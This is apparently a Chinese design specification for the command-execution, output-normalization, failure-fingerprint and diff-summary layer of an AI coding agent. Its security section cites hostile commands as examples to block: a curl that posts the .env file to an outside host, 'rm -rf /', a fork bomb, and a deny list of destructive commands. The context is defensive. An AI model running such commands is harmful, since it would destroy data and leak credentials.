# MVP-2 — Execution & Verification 设计

> 目标：为 Vibe Kernel 提供确定性的本地执行能力——命令执行 + 结果归一化 + Diff 汇总 + 重复失败检测。
> 原则：**复用 memory_tool.py artifact 子系统**（已验证的输出外置 + 分页取用 + 投影过滤 + 字节上限）；不另造输出管理。Exec 是纯函数为主，可独立于 Core 测试。

---

## 一、目标与非目标

### 目标
1. **统一执行器**：标准化执行本地命令（test/lint/build/diff），归一化输出为结构化结果（exit code / 统计 / 错误摘要 / 字节 / 耗时）。
2. **结果归一化**：把不同命令（pytest/vitest/jest/cargo test/eslint/tsc/git diff）的异构输出收敛为统一 `ExecResult`，供 Core/LLM 消费。
3. **Diff 汇总**：解析 git diff，分类文件（新增/修改/删除/高风险域），输出紧凑摘要供 S8 计划漂移校验与 S10 Review。
4. **重复失败检测**：对失败结果计算指纹（命令+退出码+错误摘要+测试名+文件+阶段），连续无变化触发 `NO_PROGRESS`（对接 Core）。
5. **输出有界（执行期即有界）**：流式采集 + 内存上限 + 超限落盘；大输出经 artifact 外置并返回 ref，分页取用——严守 VC `OUTPUT_LIMIT` 契约。**限制发生在读取过程中，不是读完之后**。
6. **执行安全边界显式化**：区分"防命令注入"与"命令行为风险"两层，各自的约束、授权与已知限制写清楚。

### 非目标
- 不替代 LLM 的失败根因分析（Exec 给结构化结果，LLM 判断根因与修复策略）。
- 不实现远程/容器执行（本地进程内；容器化留后续）。
- 不绑定特定测试框架（归一化器按 exit code + 模式匹配，不强依赖框架）。
- 不实现 CI 编排（单命令/单组命令执行，非流水线）。
- 不修改 memory_tool.py 的 artifact 实现（复用，不改）。

---

## 二、现状与证据

### 已存在（复用基础）
- **memory_tool.py artifact 子系统** **[已验证]**：`artifact put --file F [--name N] [--kind text|jsonl] [--loop N]`（大产物落盘，24h TTL，put 时回收过期，name 消毒拒路径分隔符）+ `artifact page --ref R [--offset/--limit/--max-bytes/--fields/--equals/--grep/--count]`（分页取用 + 投影 + 过滤 + 字节上限 + clamp 显式报 `OUTPUT_LIMIT`）+ `artifact list`/`release`。
  - 这是 Exec 的输出外置与分页取用的**直接复用对象**——已验证「输出有界 + 显式 clamp 不静默」契约。
- **VC `OUTPUT_LIMIT`/`ARTIFACT_NOT_FOUND` 码** **[已验证]**：`transition.md` 已定义；Exec 在输出超限时返回 `OUTPUT_LIMIT`（`[next] 分页续取 artifact page --offset`），fail-closed=否（分页续取，不阻断）。
- **memory_tool.py 工程范式** **[已验证]**：逐条容错、显式 `[next]`、fail-closed 语义、exit code 语义（0/3/4 区分）——Exec 直接借鉴。
- **`.state.md` review/pending 字段** **[已验证]**：Exec 结果流入 Core 的 `review.last_failure`/`review.issues` 与 pending 核验，字段已存在。

### 尚不存在（Exec 要新建）
- 通用命令执行器（当前 LLM 直接调 bash，无归一化/外置/超时/取消）。
- 结果归一化器（当前 LLM 读原始输出自行判断）。
- Diff 汇总器（当前 LLM 读 git diff 全文）。
- 失败指纹与重复检测（当前 `NO_PROGRESS` 由 LLM 手动判「连续无改善」）。

---

## 三、执行器设计

### 3.1 接口

```python
@dataclass(frozen=True)
class ExecRequest:
    cmd: list[str]                  # argv 数组，默认 shell=False（见 §3.3）
    cwd: str                        # 项目根（强制必填；是"解析基准"，不是沙箱）
    timeout_ms: int = 300_000       # 缺省 5 分钟（同 manifest cost.timeout_per_loop）
    env_extra: dict | None = None    # 显式追加项；宿主环境按 §3.3 的 allowlist 受控继承
    env_passthrough: list[str] = () # 显式声明额外继承的变量名
    max_output_bytes: int = 100_000 # 每流（stdout/stderr 各自）内存上限，超限落盘
    max_spill_bytes: int = 52_428_800  # 落盘硬上限（50MB），超过则丢弃并标记
    lang: str = "auto"              # 归一化器选择
    stage: str = ""                 # S8/S9/S10…，用于日志与报告（**不进指纹**，见 §5.1）
    exec_id: str = ""               # 由调用方生成（uuid4）；用于 feed_exec 幂等去重
    cancel_event: threading.Event | None = None  # Adapter 中断/用户 Esc

@dataclass(frozen=True)
class ExecResult:
    ok: bool                       # exit_code == 0 且未被取消
    exit_code: int                 # 被信号杀死时为负信号号（POSIX）；Windows 用 1 兜底
    duration_ms: int
    stdout_ref: str | None         # 仅当外置成功才非空（§3.5）
    stderr_ref: str | None
    stdout_head: str               # 内存内保留的前缀（≤ max_output_bytes），可直接读
    stderr_head: str
    stdout_bytes: int              # 真实总字节数（含已外置/丢弃部分）
    stderr_bytes: int
    externalized: bool
    truncated: bool                # 是否发生外置或丢弃
    dropped_bytes: int             # 因 max_spill_bytes 丢弃的字节（0 表示无丢弃）
    artifact_error: str | None     # 外置失败原因（此时 ref 必须为 None）
    normalized: NormalizedResult | None
    fingerprint: str               # 失败指纹（仅 ok=False 时有效；ok=True 时为 "")
    vc_code: str | None            # OUTPUT_LIMIT / ENV_ERROR / TIMEOUT / CANCELLED / OK
    next: str | None
    env_redactions: int            # 输出中被脱敏的凭据出现次数（§3.3）
```

> **设计要点**：`ref` 与 `head` 是**互斥补充**而非替代——ref 用于分页精读，head 保证即使外置失败/过期也有可用信息。**永不返回指向不存在产物的 ref**（原设计的硬缺陷）。

### 3.2 执行流程（流式采集，内存有界）

原设计用 `subprocess.run(capture_output=True)`：**先把全部输出读进内存再判断上限**，等于"事后限流"——大构建日志照样能被吃满。改为 Popen + 双读取线程 + 有界缓冲。

```python
def run(req: ExecRequest) -> ExecResult:
    # 1. 前置校验（fail-closed）
    if not command_exists(req.cmd[0], env=<受控 env>):
        return _env_error(req, "命令不存在")

    env = build_env(req)                        # §3.3 受控继承
    proc = subprocess.Popen(
        req.cmd, cwd=req.cwd, env=env, shell=False,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        start_new_session=(os.name == "posix"),       # 建独立进程组，便于整树终止
        creationflags=(subprocess.CREATE_NEW_PROCESS_GROUP if os.name == "nt" else 0),
    )

    sink_out = Sink(req.max_output_bytes, req.max_spill_bytes)   # 有界缓冲 + 落盘
    sink_err = Sink(req.max_output_bytes, req.max_spill_bytes)
    t_out = threading.Thread(target=_pump, args=(proc.stdout, sink_out), daemon=True)
    t_err = threading.Thread(target=_pump, args=(proc.stderr, sink_err), daemon=True)
    t_out.start(); t_err.start()

    timed_out = cancelled = False
    deadline = time.monotonic() + req.timeout_ms / 1000
    while proc.poll() is None:
        if req.cancel_event and req.cancel_event.is_set():
            cancelled = True; break
        if time.monotonic() > deadline:
            timed_out = True; break
        time.sleep(0.05)

    if timed_out or cancelled:
        kill_tree(proc)                          # §3.2.1 整树终止
        proc.wait(timeout=5)

    t_out.join(timeout=2); t_err.join(timeout=2) # 关管道后读取线程自然结束
    # 2. 归一化 → 3. 有界外置 → 4. 指纹 → 5. 码判定
    ...
```

**`Sink` 契约（内存恒有界）**：

```python
class Sink:
    """前 max_output_bytes 字节留内存；超出部分直接写 spill 文件，绝不累积在内存。"""
    def write(self, chunk: bytes) -> None:
        if self.in_memory < self.cap:
            take = min(self.cap - self.in_memory, len(chunk))
            self.buf += chunk[:take]; self.in_memory += take; chunk = chunk[take:]
        if chunk:
            if self.spilled + len(chunk) > self.max_spill:
                self.dropped += len(chunk)          # 硬上限：丢弃并记账，不 OOM
            else:
                self.spill_file.write(chunk); self.spilled += len(chunk)
```

**三条不变量**（单元测试直接断言）：

1. 内存占用 ≤ `2 × max_output_bytes`（两流）——与命令输出总量无关；
2. `stdout_bytes` 始终等于真实总字节（含外置 + 丢弃）；
3. `dropped_bytes > 0` → `truncated=True` 且 `vc_code=OUTPUT_LIMIT`，**决策信息不丢**。

#### 3.2.1 超时与取消：整进程树终止

`subprocess.run(timeout=…)` 只杀直接子进程，孙进程（`sh -c`、`npm run` 的派生、`xargs` 起的进程）会存活并继续写管道/占端口。

| 平台 | 机制 |
|---|---|
| POSIX | `start_new_session=True` → `os.killpg(os.getpgid(pid), SIGTERM)`；宽限 3s 后 `SIGKILL`；再等 5s 仍未退出 → 返回 `TIMEOUT` 并标记 `tree_leaked=True`（metrics 记账，不谎报已终止） |
| Windows | `CREATE_NEW_PROCESS_GROUP` + `taskkill /T /F /PID <pid>`；失败则 `TerminateProcess` 兜底；同样记账 `tree_leaked` |
| 取消 | 与超时同一路径，返回 `CANCELLED`（fail-closed=否，`[next] 确认是否继续该步骤`） |

**宽限期必须可配**（`kill_grace_ms`，缺省 3000）：有些测试进程需要时间写报告，硬杀会留下半截产物。

#### 3.2.2 输出外置失败的行为

外置是"尽力而为的增强"，不是执行的必需条件：

| 情况 | 行为 |
|---|---|
| `artifact put` 失败（磁盘满 / 权限 / 索引坏） | `stdout_ref=None`，`externalized=False`，`artifact_error=<原因>`，保留 `stdout_head`；`vc_code=OUTPUT_LIMIT` + `[next] 减小输出或修复 artifact 目录后重试` |
| put 成功但回读校验失败 | 同上，并且**删除刚写坏的产物**（避免污染索引） |
| 落盘超过 `max_spill_bytes` | `dropped_bytes` 记账 + `truncated=True`；**不**返回 ref |
| 引用过期（跨会话恢复时发现） | 由 Core 判定（MVP-1 §7.3），Exec 不参与 |

### 3.3 安全约束（必须说清边界）

**先说清一件事**：`shell=False` + argv 数组只消除**一类**风险（shell 元字符注入）。它阻止不了命令**本身**干危险事——`["rm","-rf","/"]`、`["git","reset","--hard"]`、`["curl","-d","@.env","http://x"]` 全都是"合法参数数组"。所以下面分两层写。

#### 3.3.1 注入层（已解决）

| 约束 | 实现 |
|---|---|
| 默认无 shell | `shell=False`，argv 数组；需 shell 必须 `allow_shell=True` 且写审计日志（Phase 1 默认禁用） |
| 参数不拼接 | 全程 `list[str]`；不接受"命令字符串 + 分隔符"形态 |
| stdin 关闭 | `stdin=DEVNULL`，避免命令等待交互挂死 |

#### 3.3.2 行为层（原设计缺失，必须显式声明）

| 问题 | 立场 |
|---|---|
| `cwd` 是沙箱吗？ | **不是**。`cwd` 只决定相对路径解析基准与 git 作用范围。绝对路径、`..` 逃逸、写 `/tmp`、写 `$HOME` 全部不受约束。**如需真隔离，用容器——不在 MVP-2 范围** |
| 命令白名单 | 缺省 **allowlist**：项目工具链二进制（`pytest`/`vitest`/`jest`/`cargo`/`npm`/`pnpm`/`yarn`/`tsc`/`eslint`/`ruff`/`mypy`/`go`/`make`）+ 只读 git 子命令（`status`/`diff`/`log`/`show`/`rev-parse`）。可经 `.vibe-kernel/config.json` 扩展，**扩展需显式列出**，不做"任意放行"开关 |
| 高风险命令 | `rm`/`rmdir`/`mv`/`dd`/`truncate`/`git push`/`git reset --hard`/`git clean`/`git checkout --`/`npm publish`/`docker`/`kubectl` → **默认拒绝**；需 `allow_high_risk=True` **且**由 Adapter 经宿主 `permission.ask` 拿用户授权（Adapter 不可用时 → 直接拒绝，不降级放行） |
| 网络访问 | Exec **不限制**网络（无沙箱能力）。声明为已知限制；需要控网时用容器/防火墙，不假装 Exec 能控 |
| 危险命令的检出 | 允许一条"最小可测"规则集：argv 命中高危模式即拒绝（`sh -c` + `rm -rf`、`chmod 777 /`、`:(){ :|:& };:`），返回 `SCOPE_DENIED`。**不承诺穷尽**——这是防手滑，不是防对抗 |
| 环境变量继承 | **allowlist 继承**（见下），不是"全继承"也不是"全清空" |
| 密钥泄露 | 输出落盘/返回前做**脱敏 pass**；`env_redactions` 计数 |

**env 策略（修正原设计的 `env=req.env` 语义错误）**：`subprocess` 的 `env` 参数是**整体替换**，传 `{FOO:1}` 会让子进程没有 `PATH`。定案：

```python
BASE_ENV_ALLOWLIST = [
    "PATH", "HOME", "USER", "TMPDIR", "LANG", "LC_ALL", "LC_CTYPE", "TZ",
    # Windows 必需项（缺失会导致大量工具异常）
    "SystemRoot", "SystemDrive", "COMSPEC", "PATHEXT", "TEMP", "TMP",
    "USERPROFILE", "APPDATA", "LOCALAPPDATA", "NUMBER_OF_PROCESSORS", "OS",
]
SECRET_NAME_RE = re.compile(r"(TOKEN|SECRET|PASSWORD|PASSWD|API_?KEY|PRIVATE_?KEY|"
                            r"CREDENTIAL|SESSION|COOKIE|AUTH)", re.I)

def build_env(req) -> dict[str, str]:
    env = {k: os.environ[k] for k in BASE_ENV_ALLOWLIST if k in os.environ}
    env.update({k: os.environ[k] for k in req.env_passthrough if k in os.environ})
    env.update(req.env_extra or {})             # 显式注入（密钥走这条，且要求调用方声明）
    return env
```

**脱敏规则**：对 stdout/stderr 全文（含落盘内容）执行替换——① `SECRET_NAME_RE` 命中的**值**（从 `env` 里取实际值精确匹配）；② 高熵长串（≥32 字符、字母数字混合）匹配常见前缀（`sk-`/`ghp_`/`AKIA`/`eyJ`）；③ `.env` 文件内容形态（`KEY=value`）。替换为 `***REDACTED***` 并累加 `env_redactions`。**未命中不猜**（避免把正常 base64 哈希改坏）。

### 3.4 归一化器（契约修正）

归一化器只吃 **`stdout_head` + `stderr_head`**（有界内存前缀），不吃全量——保证归一化本身不引入内存放大。

```python
def normalize(lang, head_out, head_err, exit_code, cmd, *, truncated) -> NormalizedResult | None:
    ...
```

`error_digest` 必须用**稳定摘要**（`sha256`），不用内置 `hash()`（见 §5.1）。

### 3.5 artifact 生命周期（对接 MVP-1 §7.3）

Exec 是产物的**生产者**，Core 是**引用持有者**。分层契约：

| 层 | 判定 | 触发 |
|---|---|---|
| `ephemeral` | 缺省；会话内可丢弃的大输出 | `artifact put` → 24h TTL |
| `pinned` | 调用方声明 `pin=True`（Stage ∈ {S9, S10} 的失败输出自动 pin） | 写 `<project_root>/.vibe-kernel/artifacts/<sha256[:16]>.log`，无 TTL |

**生产侧规则**：

1. **先校验后返回**：`put` 后立刻 `artifact page --ref R --limit 1` 回读一次；失败 → 视为外置失败（§3.2.2）。
2. **内容寻址**：pinned 文件名 = `sha256(内容)[:16]` → 同内容重复执行不重复占盘。
3. **引用携带重建信息**：`ExecResult` 的 ref 元数据含 `reproducible` + `regen_cmd` + `created_at` + `sha256`，供 Core 写入 Checkpoint（MVP-1 §7.3 引用契约）。
4. **不删除任何产物**：回收归 Core 的 `state gc`（MVP-1 §7.3 规则 4），Exec 只生产。

---

## 四、结果归一化设计

### 4.1 统一 `NormalizedResult`

```python
@dataclass
class NormalizedResult:
    kind: str               # test / lint / build / diff / generic
    pass_count: int | None  # 测试通过数（test 类）
    fail_count: int | None  # 测试失败数
    skip_count: int | None
    error_summaries: list[str]  # 失败项摘要（测试名/lint 规则/编译错误），≤10 条
    error_digest: str       # 失败项集合的稳定哈希（供指纹，见 §五）
    high_risk_hit: bool     # 是否触及高风险域（auth/金额/删除/迁移/部署/schema/加密/事务）
    stats_raw: str          # 原始统计行（人类可读，供 LLM 参考）
```

### 4.2 归一化器分发（按 cmd/lang）

```python
def normalize(lang, head_out, head_err, exit_code, cmd, *,
              truncated: bool = False) -> NormalizedResult | None:
    """只吃有界的内存前缀（§3.2 Sink），不吃全量输出——归一化不得引入内存放大。"""
    if lang == "auto":
        lang = infer_lang(cmd)  # 按 cmd[0] + 文件后缀推断
    fn = DISPATCH.get(lang)
    return fn(head_out, head_err, exit_code, truncated) if fn else None
```

**各归一化器的契约**：

- 只解析「退出码 + 统计行 + 失败项名」三类，**不解析完整堆栈**（堆栈走 artifact，LLM 按需 `artifact page` 取）。
- 模式匹配容错：解析失败 → 返回 `None`（降级为 `unknown`），**不裸抛**。
- **`truncated=True` 时必须设 `stats_raw` = `"输出已截断"` 并降低置信度**：末行统计可能落在被外置/丢弃的区间里，此时**不得**报"0 failed"这类假结论——宁可 `None`。这是「输出有界」与「结果可信」的接缝，必须显式处理。
- `error_digest` = `sha256` 稳定摘要（§5.1）。

### 4.3 归一化示例（pytest）

```python
def _norm_pytest(head_out, head_err, exit_code, truncated) -> NormalizedResult:
    tail = head_out[-4000:]                       # 只看尾部窗口
    m = re.search(r"(\d+) passed(?:.*?(\d+) failed)?(?:.*?(\d+) skipped)?", tail)
    if m is None and truncated:
        return None                               # 统计行可能已被截断 → 不猜
    fails = extract_failed_names(head_out)        # FAILED tests/test_x.py::test_a
    return NormalizedResult(
        kind="test",
        pass_count=int(m.group(1)) if m else None,
        fail_count=int(m.group(2) or 0) if m else None,
        skip_count=int(m.group(3) or 0) if m else None,
        error_summaries=fails[:10],
        error_digest="sha256:" + hashlib.sha256("\n".join(fails).encode()).hexdigest(),
        high_risk_hit=scan_high_risk(fails),
        stats_raw=m.group(0) if m else "输出已截断")
```

---

## 五、失败指纹与重复检测（对接 Core `repeat_check`）

原设计有四个缺陷：内置 `hash()` 跨进程不稳定、用集合包含代替"连续"判断、连续计数只在内存、指纹含 `stage` 导致同错跨阶段被算两次。逐条修正。

### 5.1 指纹定义（稳定、规范化、可解释）

```python
FINGERPRINT_VERSION = 1

def compute_fingerprint(req, exit_code, norm, *, stderr_head: str) -> str:
    """稳定指纹：同一失败重复出现可机械判定。

    规范化输入 = 一个 JSON 对象（键排序后序列化），而不是字符串拼接——
    拼接会因分隔符/顺序/空格差异产生假差异。
    """
    payload = {
        "v": FINGERPRINT_VERSION,
        "tool": tool_identity(req.cmd),        # 例: "pytest" / "npm:eslint"
        "args": normalize_args(req.cmd[1:], req.cwd),  # 去绝对路径前缀、去时间戳/随机数
        "exit": exit_code,
        "digest": norm.error_digest if norm else stable_digest(stderr_head),
    }
    return "fp:" + hashlib.sha256(
        json.dumps(payload, sort_keys=True, separators=(",", ":"),
                   ensure_ascii=False).encode("utf-8")).hexdigest()
```

**为什么每条都这样定**：

| 项 | 处理 | 理由 |
|---|---|---|
| 摘要算法 | `sha256` | 内置 `hash()` 对 str 有进程级随机化（PYTHONHASHSEED），跨会话比较必然失效；`sha1` 无必要 |
| `tool` | `cmd[0]` 的 basename（+ npm/pnpm 脚本名） | 同一命令经不同绝对路径调用应视为同一工具 |
| `args` | 去掉 cwd 前缀、去 `-v` 这类只影响冗长度的开关、去临时输出路径 | 与"失败是否相同"无关的差异不该改指纹 |
| `exit` | 原样 | 同错误不同退出码通常意味着不同失败路径 |
| **`stage`** | **不进指纹** | 同一个错误在 S8/S9 出现是同一次失败。阶段只写日志与报告（`ExecResult.stage`）——原设计把它放进指纹，会让"连续 2 次同一失败"在跨阶段时永远无法触发 |
| 耗时 / 字节数 / 时间戳 | 不进 | 每次不同且与失败身份无关 |

### 5.2 连续判定（`last_fingerprint` + `consecutive_count`，不用集合）

```python
# Core 侧（MVP-1 §5.4 持久化 + §3.4 NO_PROGRESS 判定）
def repeat_check(self, fingerprint: str, *, exec_id: str = "") -> RepeatResult:
    fs = self.state.review.failure_state
    if exec_id and exec_id == fs.last_exec_id:
        return RepeatResult(repeat=fs.consecutive_count >= 2, deduped=True)  # 幂等
    if fingerprint == fs.last_fingerprint:
        fs.consecutive_count += 1
    else:
        fs.last_fingerprint = fingerprint
        fs.consecutive_count = 1
    fs.last_exec_id = exec_id
    fs.history = (fs.history + [fingerprint])[-10:]        # 仅审计，不参与判定
    self._write_state(...)                                  # 落盘 → 跨重启/恢复不丢
    if fs.consecutive_count >= 2:
        return RepeatResult(repeat=True, vc_code="NO_PROGRESS",
                            next="进 S14，输出风险报告")
    return RepeatResult(repeat=False, consecutive=fs.consecutive_count)
```

**为什么不用 `fingerprint in history`**：集合包含判断无法表达"连续"。设历史 `[A, B, A]`，再出现 `A` 时集合判断会说"重复"，但实际序列是 `A→B→A`——中间有变化，**不是连续无改善**。连续只能由 `last_* + count` 表达。

**持久化**：计数写入 `.state.md` 的 `review.failure_state`（MVP-1 §5.4）。原设计的 `self._consecutive_same` 是内存变量，进程重启/会话恢复即归零 → `NO_PROGRESS` 永不触发（或误触发），这是 P0 级缺陷。

**重置规则**（穷举，避免"什么时候归零"靠猜）：

| 触发 | 效果 | 依据 |
|---|---|---|
| 出现不同指纹 | `count = 1`，`last_fingerprint` 更新 | 失败内容变了 = 有变化 |
| 任意一次 `ok=True` 执行 | `count = 0`，`last_fingerprint = ""`，记 `last_ok_at` | 成功即打断连续 |
| 新任务（S13→S1 / `goal` 变更） | `count = 0` 全清 | 重试预算重置（`kernel.md` §1 follow-up） |
| `loop` 递增（S9→S8 / S10→S8 / S10→S6） | **不重置** | 预算消耗 ≠ 失败序列中断 |
| 阶段变化（S8↔S9） | **不重置** | 同错误跨阶段仍是同失败（配合 stage 不进指纹） |
| **代码被修改但仍同指纹** | **不重置** | 改了代码错误照旧 = *更强*的无进展证据，应更早触发而非重置 |
| 用户显式 override（`vc_state --reset-no-progress`） | `count = 0` + 写 `decisions` 记账 | 人工介入后重新计 |
| 环境类失败（`ENV_ERROR`/`TIMEOUT`/`CANCELLED`） | **不进入指纹计数** | 不是代码失败，不消耗预算（`transition.md`「标否的码不消耗 Loop」） |

### 5.3 指纹的语义边界（它是机械信号，不是根因结论）

**同指纹 ≠ 零进展**：修了 A 导致 B 也失败，指纹可能仍是同一条错误摘要，但代码确实变了。因此：

- 指纹只用于**触发机制**（重复执行同一失败 → 提示 LLM 复核 / 触发 S14），**不用于**判定"LLM 没努力"或"根因未变"。
- `ExecResult` 与 `RepeatResult` 都携带**人类可读证据**（`tool`/`exit`/`error_digests`/`consecutive`），供 LLM 自行判断是否真的卡住。
- `NO_PROGRESS` 的 `[next]` 是"进 S14 输出风险报告"——**不是**"停止修复"。风险报告里 LLM 可以说明"指纹相同但已改 3 处代码，建议提高预算"，由用户裁决。

### 5.4 指纹历史的存储位置（原 U9 定案）

存 `.state.md` 的 `review.failure_state`（MVP-1 §5.4 / §4.1.1 保留扩展子键）：

- **不进顶层** → 13 字段语义字段数不变，不触发 schema 版本升级；
- **持久化** → 跨进程/跨会话恢复；
- **有界** → `history` 最多 10 条环形，不撑大状态文件；
- **零迁移成本** → 缺失该子键时按空初始化，老文件照常读。

---

## 六、Diff 汇总设计

原设计的问题：`git diff` **不含未跟踪文件**（即使 `git diff HEAD` 也不含），也没有覆盖"已暂存"与"重命名"；非 git 降级只写"mtime 对比"却没定义基线何时建立、存在哪。

### 6.1 接口

```python
@dataclass(frozen=True)
class FileEntry:
    path: str        # 相对路径，统一 POSIX 分隔符（/）
    key: str         # 归一化比较键（见 §6.4）

@dataclass
class DiffSummary:
    added: list[FileEntry]
    modified: list[FileEntry]
    deleted: list[FileEntry]
    renamed: list[tuple[FileEntry, FileEntry]]   # (from, to)
    untracked: list[FileEntry]
    high_risk_files: list[FileEntry]
    total_insertions: int
    total_deletions: int
    plan_drift: PlanDrift | None      # 集合差异，不是字符串不等（§6.5）
    baseline: str                     # "git:HEAD" | "snapshot:<ts>" | "none"
    degraded: bool                    # 非 git / 无提交 / 无基线
    degraded_reason: str | None

@dataclass
class PlanDrift:
    unplanned: list[FileEntry]        # 改了但计划里没声明
    missing: list[FileEntry]          # 计划声明了但实际没改
    renamed_unplanned: list[tuple[FileEntry, FileEntry]]

def summarize_diff(cwd: str, *, plan_files: list[str] | None = None,
                   base: str | None = None) -> DiffSummary: ...
```

### 6.2 实现（Git：一次拿全，不漏未跟踪）

```python
def _collect_git(cwd, base) -> DiffSummary:
    # ① 工作区全量状态（含未跟踪，-z 避免文件名含空格/换行时解析错）
    status = git(["status", "--porcelain=v2", "-z", "--untracked-files=all"], cwd)
    # ② 已暂存 vs 基线
    staged = git(["diff", "--name-status", "-z", "--find-renames", "--cached", base], cwd)
    # ③ 未暂存 vs 基线
    worktree = git(["diff", "--name-status", "-z", "--find-renames", base], cwd)
    entries = merge_entries(status, staged, worktree)   # 同类去重、renamed 优先
    # ④ 统计量（含未跟踪时 --stat 不含未跟踪，故用 ① 的增删行或 wc）
    ins, dels = parse_numstat(git(["diff", "--numstat", "-z", base], cwd))
    ...
```

**必须覆盖的六类改动**（原设计只覆盖两类）：

| 类别 | 来源 | 说明 |
|---|---|---|
| 已暂存新增/修改/删除 | `diff --cached` | 原设计漏掉：LLM 或用户 `git add` 后，`git diff` 为空 |
| 未暂存修改/删除 | `diff` | 常规路径 |
| **未跟踪文件** | `status --porcelain=v2` | 原设计漏掉：新文件不出现，导致 `plan_drift` 误判"没超出计划" |
| **重命名** | `--find-renames` | 原设计漏掉：改名被算成"删一个 + 新增一个"，污染 `unplanned` |
| 冲突态（`UU`/`AA`） | `status` | 记为 `modified` + `conflicted=True` 标记，供 S10 Review 关注 |
| 子模块变更 | `status` 的 `S` 项 | 记入 `modified`，不递归 |

**性能**：三次 git 调用（`status`/`diff --cached`/`diff`）而非逐文件，200 文件级项目 < 100ms。

### 6.3 非 Git 降级：显式基线快照协议

「mtime 对比」必须有基线，否则首次调用没有参照物。定案：

```text
基线位置（现行）：~/.vibe-loop/baseline/<sha256(project_root)[:16]>.json（历史设计曾用 <project_root>/.vibe-kernel/baseline.json）
建立时机：S8 Code 入口首次调用 summarize_diff 时（无基线则创建），或显式 `exec baseline`
内容：{created_at, root, entries: {relpath: {mtime_ns, size, sha256?}}}
比较规则：
  - 基线与现在的路径集合差 → added / deleted
  - 同路径 mtime_ns 或 size 变化 → modified
  - sha256 仅在 verify=True 时计算（默认不算，避免全仓哈希开销）
  - 忽略：.vibe-kernel/、node_modules/、.venv/、venv/、dist/、build/、target/、
          __pycache__/、*.pyc、.git/，外加 .gitignore 中的条目（尽力解析其简单模式）
```

| 项目类型 | 基线 | 标记 |
|---|---|---|
| git 有提交 | `git:<base>`（缺省 `HEAD`） | `degraded=False` |
| git 空仓库（无提交） | `snapshot:<ts>`（自动建快照） | `degraded=True, reason="no_commits"` |
| 非 git | `snapshot:<ts>` | `degraded=True, reason="not_a_repo"` |
| 快照创建失败（只读/权限） | `none` | `degraded=True, reason="no_baseline"`；`plan_drift=None`（**明确说"无法判定"，而不是报"无漂移"**） |

> **关键语义**：基线缺失时 `plan_drift = None` ≠ `plan_drift = 空集`。前者是"无法判定"，后者是"判定为无漂移"。原设计混用了这两种，会让 S8 出口的 PLAN_DRIFT 检查形同虚设。

### 6.4 路径归一化（跨平台）

```python
def norm_path(abs_or_rel: str, root: Path) -> FileEntry:
    rel = os.path.relpath(os.path.realpath(abs_or_rel), os.path.realpath(root))
    posix = rel.replace(os.sep, "/")                     # 统一分隔符
    key = posix.casefold() if CASE_INSENSITIVE_FS else posix
    return FileEntry(path=posix, key=key)
```

- **显示用 `path`**（保留大小写，供人读）；**比较用 `key`**。
- `CASE_INSENSITIVE_FS`：Windows 与 macOS 默认卷 = True；Linux = False。探测方式：创建临时文件后用大小写变体 `stat`（探测失败 → 按 `sys.platform` 保守默认）。
- 仓库外路径（`../x`）记入 `outside_cwd` 并按 `SCOPE_DENIED` 提示——`cwd` 不是沙箱（§3.3.2），但**越界必须可见**。
- 文件名含空格/换行/Unicode：全程 `-z` 解析 + `os.fsdecode`，**不**用 `splitlines()`。

### 6.5 `plan_drift` 是可审计的集合差异

```python
def compute_drift(actual: list[FileEntry], plan: list[str], root: Path) -> PlanDrift:
    plan_entries = [norm_path(p, root) for p in plan]
    plan_globs = [e.key for e in plan_entries if any(c in e.path for c in "*?[")]
    plan_exact = {e.key for e in plan_entries if not any(c in e.path for c in "*?[")}
    def declared(key: str) -> bool:
        return key in plan_exact or any(fnmatch.fnmatch(key, g) for g in plan_globs)
    unplanned = [e for e in actual if not declared(e.key)]
    missing = [e for e in plan_entries if e.key in plan_exact
               and e.key not in {a.key for a in actual}]
    return PlanDrift(unplanned=unplanned, missing=missing, ...)
```

**三点改进**（相对原设计的 `f not in plan_files` 字符串比较）：

1. **两侧都归一化**（大小写/分隔符/相对基准一致），否则 Windows 下必然假漂移；
2. **支持 glob**（`rules/plan.md` 的计划契约允许声明目录/模式）；
3. **同时报 `missing`**——计划声明了却没改，同样是漂移信号，原设计只报"多改"。

---

## 七、与 Core 的接缝

```text
LLM 调 Exec.run(req) ──► ExecResult ──► LLM 判定通过/失败
                                          │
                                          ▼ 失败时
                          Exec.fingerprint ──► Core.feed_exec(result) / repeat_check(fp)
                                                  │
                          ┌───────────────────────┴───────────────────────┐
                          ▼                                               ▼
                  首次失败（PASS_NEW_FAILURE）                  连续无变化（NO_PROGRESS）
                  LLM 走 S8[N+1]                                 Core 强制转 S14
```

**Diff 汇总与 PLAN_DRIFT**：
```text
S8 出口 ──► Exec.summarize_diff(cwd, plan_files=S7声明集)
              │
              ▼ plan_drift.unplanned 非空 或 plan_drift.missing 非空
      Core.feed_exec(diff_summary) ──► 返回 VC PLAN_DRIFT
              │                        [next] 补记偏离理由 或 回 S7 重规划
              ▼ 记录后继续（fail-closed=否，不阻断）
```

**接缝契约（冻结项）**：

| 契约 | 内容 | 违约后果 |
|---|---|---|
| `ExecResult` 字段集 | MVP-2 开发期冻结；新增字段必须可选 | Core 解析失败 |
| `feed_exec` / `repeat_check` 签名 | MVP-1 锁定（含 `exec_id` 幂等参数） | 重复计数错 |
| **幂等** | 同一 `exec_id` 重复 `feed_exec` 只计一次 | 恢复/重放时把 `NO_PROGRESS` 提前触发 |
| **产物引用** | ref 只在**回读校验通过后**才出现在 `ExecResult` 中 | Core 恢复出指向空气的引用 |
| **空值语义** | `plan_drift=None` = 无法判定；`PlanDrift([], [])` = 判定无漂移 | PLAN_DRIFT 形同虚设 |

---

## 八、实现层次与文件布局

```
runtime/exec/                # Exec 实现（新建，零第三方依赖）
├── __init__.py
├── runner.py               # run() + Popen 流式调度 + 超时/取消
├── proc_tree.py            # 跨平台整树终止（POSIX killpg / Windows taskkill /T）
├── sink.py                 # 有界缓冲 + spill 落盘 + max_spill 丢弃记账
├── env.py                  # allowlist 继承 + env_extra + secret 名匹配
├── redact.py               # 输出脱敏 pass（凭据值 / 高熵串 / .env 形态）
├── policy.py               # allowlist / 高风险拒绝 / 危险模式检出
├── normalizers/            # 各框架归一化器（纯函数，只吃 head）
│   ├── pytest.py  vitest.py  jest.py  cargo.py
│   ├── eslint.py  tsc.py  git_diff.py
│   └── generic.py          # unknown 降级
├── fingerprint.py          # compute_fingerprint（sha256 + 规范 JSON）
├── diff.py                 # summarize_diff + six-class 覆盖 + 基线快照
├── pathnorm.py             # 跨平台路径归一化 + 大小写探测
